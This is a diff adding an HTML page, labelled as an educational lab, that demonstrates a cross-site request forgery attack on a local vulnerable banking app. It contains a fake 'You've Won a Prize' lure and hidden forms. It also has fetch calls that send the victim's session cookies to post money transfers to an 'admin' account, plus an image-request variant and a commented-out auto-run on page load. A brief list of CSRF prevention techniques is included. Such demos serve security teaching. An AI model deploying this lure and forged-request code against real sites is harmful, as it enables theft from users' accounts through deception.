@@ -1,0 +1,192 @@
+<!DOCTYPE html>
+<html lang="en">
+<head>
+    <meta charset="UTF-8">
+    <meta name="viewport" content="width=device-width, initial-scale=1.0">
+    <title>CSRF Attack Demo - Malicious Website</title>
+    <style>
+        body {
+            font-family: Arial, sans-serif;
+            max-width: 800px;
+            margin: 0 auto;
+            padding: 20px;
+            background-color: #ffe6e6;
+        }
+        .warning {
+            background-color: #ff4444;
+            color: white;
+            padding: 15px;
+            border-radius: 8px;
+            margin-bottom: 20px;
+        }
+        .demo-section {
+            background-color: white;
+            padding: 20px;
+            border-radius: 8px;
+            margin-bottom: 20px;
+            border: 2px solid #ff4444;
+        }
+        .hidden-form {
+            display: none;
+        }
+        .attack-button {
+            background-color: #ff4444;
+            color: white;
+            padding: 10px 20px;
+            border: none;
+            border-radius: 5px;
+            cursor: pointer;
+            font-size: 16px;
+        }
+        .attack-button:hover {
+            background-color: #cc0000;
+        }
+        .fake-content {
+            background-color: #f0f8ff;
+            padding: 15px;
+            border-radius: 8px;
+            border: 1px solid #0066cc;
+        }
+    </style>
+</head>
+<body>
+    <div class="warning">
+        <h2>⚠️ EDUCATIONAL CSRF ATTACK DEMO</h2>
+        <p>This page demonstrates a Cross-Site Request Forgery (CSRF) attack against the vulnerable banking application. Use this ONLY for educational purposes on your own test environment.</p>
+    </div>
+
+    <div class="fake-content">
+        <h1>🎉 Congratulations! You've Won a Prize!</h1>
+        <p>Click the button below to claim your $1000 prize money!</p>
+        <button class="attack-button" onclick="executeCSRFAttack()">Claim My Prize! 🎁</button>
+    </div>
+
+    <div class="demo-section">
+        <h3>How This CSRF Attack Works:</h3>
+        <ol>
+            <li><strong>Social Engineering:</strong> Users are lured to this malicious website with attractive offers</li>
+            <li><strong>Hidden Form:</strong> When they click the button, a hidden form submits a money transfer request</li>
+            <li><strong>Authentication Bypass:</strong> The request uses the user's existing session cookies</li>
+            <li><strong>Unauthorized Transfer:</strong> Money is transferred without the user's knowledge</li>
+        </ol>
+    </div>
+
+    <!-- Hidden CSRF Attack Forms -->
+    
+    <!-- Attack 1: Transfer money to attacker -->
+    <form id="csrfAttack1" class="hidden-form" method="POST" action="http://localhost:5000/api/transfer">
+        <input type="hidden" name="fromUserId" value="5">
+        <input type="hidden" name="toUsername" value="admin">
+        <input type="hidden" name="amount" value="1000">
+        <input type="hidden" name="description" value="CSRF Attack - Money stolen!">
+    </form>
+
+    <!-- Attack 2: Auto-executing attack on page load -->
+    <form id="autoAttack" class="hidden-form" method="POST" action="http://localhost:5000/api/transfer">
+        <input type="hidden" name="fromUserId" value="5">
+        <input type="hidden" name="toUsername" value="admin">
+        <input type="hidden" name="amount" value="500">
+        <input type="hidden" name="description" value="Auto CSRF - Executed on page load">
+    </form>
+
+    <div class="demo-section">
+        <h3>CSRF Attack Variations:</h3>
+        
+        <h4>1. Button Click Attack</h4>
+        <p>User thinks they're claiming a prize, but actually transferring money:</p>
+        <button class="attack-button" onclick="executeCSRFAttack()">Execute Manual CSRF Attack</button>
+        
+        <h4>2. Auto-Executing Attack</h4>
+        <p>Attack executes automatically when page loads (uncomment JavaScript below):</p>
+        <button class="attack-button" onclick="executeAutoAttack()">Execute Auto CSRF Attack</button>
+        
+        <h4>3. Image-Based Attack</h4>
+        <p>Attack hidden in an image request:</p>
+        <button class="attack-button" onclick="executeImageAttack()">Execute Image CSRF Attack</button>
+    </div>
+
+    <div class="demo-section">
+        <h3>Prevention Techniques:</h3>
+        <ul>
+            <li><strong>CSRF Tokens:</strong> Include unique, unpredictable tokens in forms</li>
+            <li><strong>SameSite Cookies:</strong> Set cookies with SameSite attribute</li>
+            <li><strong>Origin Validation:</strong> Check Origin and Referer headers</li>
+            <li><strong>Custom Headers:</strong> Require custom headers for sensitive requests</li>
+            <li><strong>Re-authentication:</strong> Require password for sensitive operations</li>
+        </ul>
+    </div>
+
+    <script>
+        function executeCSRFAttack() {
+            if (confirm('Execute CSRF attack? (Educational purposes only)')) {
+                // This would transfer money from the logged-in user to the attacker
+                fetch('http://localhost:5000/api/transfer', {
+                    method: 'POST',
+                    headers: {
+                        'Content-Type': 'application/json',
+                    },
+                    credentials: 'include', // Important: includes cookies
+                    body: JSON.stringify({
+                        fromUserId: 5, // User ID for ycp27
+                        toUsername: 'admin',
+                        amount: 100,
+                        description: 'CSRF Attack - Educational Demo'
+                    })
+                })
+                .then(response => response.json())
+                .then(data => {
+                    if (data.success) {
+                        alert('CSRF Attack Successful! $100 transferred to admin account. Check the banking app to verify.');
+                    } else {
+                        alert('CSRF Attack Failed: ' + data.message);
+                    }
+                })
+                .catch(error => {
+                    alert('CSRF Attack Error: ' + error.message);
+                });
+            }
+        }
+
+        function executeAutoAttack() {
+            // Auto-executing CSRF attack
+            fetch('http://localhost:5000/api/transfer', {
+                method: 'POST',
+                headers: {
+                    'Content-Type': 'application/json',
+                },
+                credentials: 'include',
+                body: JSON.stringify({
+                    fromUserId: 5, // User ID for ycp27
+                    toUsername: 'admin',
+                    amount: 50,
+                    description: 'Auto CSRF - Page Load Attack'
+                })
+            })
+            .then(response => response.json())
+            .then(data => {
+                console.log('Auto CSRF executed:', data);
+                alert('Auto CSRF attack executed! Check banking app.');
+            })
+            .catch(error => {
+                console.error('Auto CSRF failed:', error);
+            });
+        }
+
+        function executeImageAttack() {
+            // Image-based CSRF (won't work for POST with JSON, but demonstrates concept)
+            const img = new Image();
+            img.src = 'http://localhost:5000/api/transfer?' + 
+                      'fromUserId=5&toUsername=admin&amount=25&description=Image CSRF Attack';
+            
+            img.onerror = function() {
+                alert('Image-based CSRF attempted (will likely fail due to POST requirement)');
+            };
+        }
+
+        // Uncomment to execute attack automatically on page load
+        // window.onload = function() {
+        //     setTimeout(executeAutoAttack, 2000); // Execute after 2 seconds
+        // };
+    </script>
+</body>
+</html>
